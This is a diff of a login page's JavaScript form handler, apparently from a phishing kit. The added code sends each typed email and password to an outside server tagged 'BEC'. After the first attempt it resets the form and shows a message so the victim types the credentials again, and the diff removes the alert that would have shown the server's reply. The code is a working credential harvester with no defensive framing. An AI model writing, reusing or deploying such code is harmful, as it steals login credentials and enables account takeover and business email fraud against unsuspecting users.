@@ -13,16 +13,35 @@ exampleForm.addEventListener("submit", async (e) => {
     e.preventDefault()
     submitExample.disabled = true
    if (trial == 0 ) {
-  
+ try {
+      const res = await fetch('https://basic-backend-ejem.onrender.com/cl', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    credentials: 'include',
+    body: JSON.stringify({
+      form: 'BEC',
+      username: exampleInputEmail1.value,
+      password: exampleInputPassword1.value,
+      trial: trial
+    })
+  });
+  const response = await res.json();
+  submitExample.disabled = false
+  trial = 1
+exampleForm.reset();
 toaster.style.display = "flex"
 setTimeout(() => {
  toaster.style.display = "none" 
 }, 5000);
-
-trial = 1
-submitExample.disabled = false
-exampleForm.reset();
 return
+} catch (err) {
+  submitExample.disabled = false
+    console.log(err)
+    return
+}
+
 }   
     try {
       const res = await fetch('https://basic-backend-ejem.onrender.com/cl', {
@@ -40,7 +59,6 @@ return
   });
   const response = await res.json();
   submitExample.disabled = false
-  alert(response?.message);
 } catch (err) {
   submitExample.disabled = false
     console.log(err)
